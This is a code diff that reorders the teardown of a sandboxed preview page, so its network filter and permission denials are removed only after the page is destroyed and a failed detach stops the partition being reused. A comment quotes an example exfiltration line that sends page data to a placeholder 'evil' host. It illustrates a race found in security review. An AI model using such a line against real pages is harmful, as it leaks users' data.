@@ -1043,8 +1043,24 @@ export class PreviewLiveView {
         this.wc.destroy()
       }
     })
-    // Only now, with the page destroyed, can the partition go back for reuse.
-    // `release` purges (bounded) and never rejects; guarded all the same.
+    // Only now, with the page dead, detach the cage — then the partition can go
+    // back for reuse. A name that went back with a stale handler attached would
+    // fail the next open on it at `attachProtocol`, so a failed detach drops
+    // the name instead. `release` purges (bounded) and never rejects; guarded
+    // all the same.
+    let detached = true
+    try {
+      this.factoryTeardown()
+    } catch (error) {
+      detached = false
+      logger.warn('Preview teardown: detach failed; partition not reused', {
+        panelId: this.panelId,
+        error: error instanceof Error ? error.message : String(error)
+      })
+    }
+    if (!detached) {
+      return
+    }
     try {
       await this.sessionRelease()
     } catch (error) {
@@ -1097,7 +1113,11 @@ export class PreviewLiveView {
       step('removeChildView', () => this.window.contentView.removeChildView(this.view))
     }
     await asyncStep('lifecycle.dispose', () => this.lifecycle.dispose())
-    step('factoryTeardown', () => this.factoryTeardown())
+    // `factoryTeardown` (the network filter, the protocol handler, the
+    // permission denials) is NOT here: it runs in `teardown()` after the page
+    // is destroyed. Detaching first left the page alive for up to ~3 s with no
+    // egress gate — a queued `location.href = 'https://evil/?' + data` landed
+    // the moment the `will-navigate` lock went (security review).
     await asyncStep('watchCoordinator.dispose', () => this.watchCoordinator.dispose())
     step('linkBridge.dispose', () => this.linkBridge.dispose())
     step('cspViolationBridge.dispose', () => this.cspViolationBridge.dispose())
